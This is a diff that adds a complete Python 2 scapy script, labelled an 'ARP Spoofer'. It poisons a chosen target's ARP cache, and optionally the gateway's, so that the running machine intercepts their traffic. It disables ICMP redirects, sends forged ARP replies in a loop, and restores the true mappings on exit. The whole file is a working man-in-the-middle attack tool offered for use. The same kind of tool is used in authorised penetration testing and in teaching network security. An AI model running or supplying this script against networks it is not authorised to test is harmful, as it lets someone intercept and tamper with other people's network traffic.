@@ -1,0 +1,91 @@
+#!/usr/bin/env python2
+
+from scapy.all import *
+from argparse import ArgumentParser
+import sys
+import time
+import traceback
+import os
+
+parser = ArgumentParser(description="ARP Spoofer")
+parser.add_argument(dest="host", metavar="host", nargs=1, help="IP of the host to spoof")
+parser.add_argument("-i","--interface", help="Interface to use")
+parser.add_argument("-t","--target", required=True, help="IP of the target your are poisoning")
+parser.add_argument("-d","--delay", default=2, help="ARP packet frequency in seconds")
+parser.add_argument("-r","--both", dest="both", action="store_true", help="ARP cache poison both target and ")
+args = parser.parse_args()
+
+target_ip = args.target
+gw_ip = args.host[0]
+
+#Disable ICMP redirects
+print "*Disable ICMP redirects"
+for iface in get_if_list():
+    os.system("sysctl -w net.ipv4.conf.{}.send_redirects=0".format(iface))
+
+#Fetch victim and gateway MAC address
+try:
+    target_ip = [ip for ip in IP(dst=target_ip)][0].dst
+    target_hw = getmacbyip(target_ip)
+    gw_ip = [ip for ip in IP(dst=gw_ip)][0].dst
+    gw_hw = getmacbyip(gw_ip)
+except:
+    print "Invalid parameter"
+    sys.exit(1)
+
+print "*Using target MAC address {}".format(target_hw)
+print "*Using host MAC address {}".format(gw_hw)
+
+if args.interface:
+    try:
+        own_hw = get_if_hwaddr(args.interface)
+        print "*Using own MAC address {}".format(own_hw)
+    except:
+        print "Invalid network interface {}".format(args.interface)
+        sys.exit(1)
+else:
+    #fetch hwsrc
+    fetch_own_mac = Ether()/ARP(pdst=gw_ip)
+    own_hw = fetch_own_mac.src
+    print "*Using own MAC address {}".format(own_hw)
+
+
+if not target_hw or not gw_hw or not own_hw:
+    print "-----------------------------------------------------"
+    print "First use initialisation done ! launch the tool again"
+    print "-----------------------------------------------------"
+    sys.exit(1)
+
+to_target = Ether()/ARP(op=2, psrc=gw_ip, hwsrc=own_hw, pdst=target_ip, hwdst=target_hw)
+to_gw = Ether()/ARP(op=2, psrc=target_ip, hwsrc=own_hw, pdst=gw_ip, hwdst=gw_hw)
+
+antidote_to_target = Ether()/ARP(op=2, psrc=gw_ip, hwsrc=gw_hw, pdst=target_ip, hwdst=target_hw)
+antidote_to_gw = Ether()/ARP(op=2, psrc=target_ip, hwsrc=target_hw, pdst=gw_ip, hwdst=gw_hw)
+
+try:
+    while True:
+        #Spoofing target
+        print "Spoofing target {} ==> arp-reply {} is at {}".format(target_ip, gw_ip, own_hw)
+        sendp(to_target, verbose=False)
+        
+        #Spoofing gateway
+        if args.both:
+            print "Spoofing gateway {} ==> arp-reply {} is at {}".format(gw_ip, target_ip, own_hw)
+            sendp(to_gw, verbose=False)
+
+        time.sleep(args.delay)
+
+except KeyboardInterrupt:
+    print
+    print "*Restoring true ARP cache for target (and gateway)..."
+    for i in range(2):
+        #Antidote target
+        print "Antidoting target {} ==> arp-reply {} is at {}".format(target_ip, gw_ip, gw_hw)
+        sendp(antidote_to_target, verbose=False)
+
+        #Antidote gateway
+        if args.both:
+            print "Antidoting gateway {} ==> arp-reply {} is at {}".format(gw_ip, target_ip, target_hw)
+            sendp(antidote_to_gw, verbose=False)
+
+        time.sleep(args.delay)
